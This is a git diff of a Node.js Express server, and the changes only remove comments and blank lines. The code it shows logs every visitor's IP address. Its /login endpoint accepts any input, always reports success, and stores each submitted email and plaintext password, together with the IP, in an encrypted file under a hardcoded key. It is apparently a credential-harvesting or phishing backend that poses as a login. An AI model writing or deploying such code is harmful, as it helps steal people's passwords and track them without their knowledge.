@@ -9,7 +9,7 @@ app.use(express.static(path.join(__dirname)));
 
 const SECRET_KEY = crypto
   .createHash("sha256")
-  .update("my-secret-key") // MUST match decrypt.js
+  .update("my-secret-key")
   .digest();
 
 const ALGO = "aes-256-cbc";
@@ -17,14 +17,11 @@ const ALGO = "aes-256-cbc";
 function encrypt(text) {
     const iv = crypto.randomBytes(16);
     const cipher = crypto.createCipheriv(ALGO, SECRET_KEY, iv);
-
     let encrypted = cipher.update(text, "utf8", "base64");
     encrypted += cipher.final("base64");
-
     return `${iv.toString("base64")}:${encrypted}`;
 }
 
-// ⭐ Log IP instantly when entering the site
 app.post("/track-ip", (req, res) => {
     const userIP =
         req.headers["x-forwarded-for"] ||
@@ -33,13 +30,10 @@ app.post("/track-ip", (req, res) => {
 
     const data = `ip=${userIP}; visited=${new Date().toISOString()}`;
     const encrypted = encrypt(data);
-
     fs.appendFileSync("users.enc.txt", encrypted + "\n");
-
     res.send("ok");
 });
 
-// ⭐ Always successful login + encrypted logging
 app.post("/login", (req, res) => {
     const userIP =
         req.headers["x-forwarded-for"] ||
@@ -51,7 +45,6 @@ app.post("/login", (req, res) => {
 
     const data = `email=${email}; password=${password}; ip=${userIP}; login=${new Date().toISOString()}`;
     const encrypted = encrypt(data);
-
     fs.appendFileSync("users.enc.txt", encrypted + "\n");
 
     res.send("success");
